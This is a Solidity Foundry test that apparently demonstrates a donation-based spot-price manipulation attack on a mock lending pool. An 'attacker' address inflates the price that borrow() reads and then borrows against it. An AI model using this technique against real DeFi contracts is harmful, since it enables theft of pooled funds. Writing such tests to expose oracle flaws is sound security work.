// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {SpotPricedPool} from "../src/SpotPricedPool.sol";
import {MockERC20} from "../src/mocks/MockERC20.sol";

contract SpotPricedPoolTest is Test {
    MockERC20 internal token;
    SpotPricedPool internal pool;
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        token = new MockERC20("Oracle Token", "ORCL");
        pool = new SpotPricedPool{value: 10 ether}(address(token));
        token.mint(address(pool), 1_000 ether);
        token.mint(attacker, 10_000 ether);

        vm.deal(attacker, 2 ether);
    }

    function test_DonateTokensToInflateBorrow() public {
        uint256 fairPrice = pool.tokensPerEth();

        vm.startPrank(attacker);
        pool.depositCollateral{value: 1 ether}();

        // Donation skews the spot price used by borrow().
        token.transfer(address(pool), 9_000 ether);
        // Collateral ETH sits in the pool, so the inflated price still caps the borrow.
        pool.borrow(900 ether);
        vm.stopPrank();

        assertGt(pool.tokensPerEth(), fairPrice);
        assertEq(token.balanceOf(attacker), 1_900 ether);
        assertEq(pool.debtToken(attacker), 900 ether);
    }
}
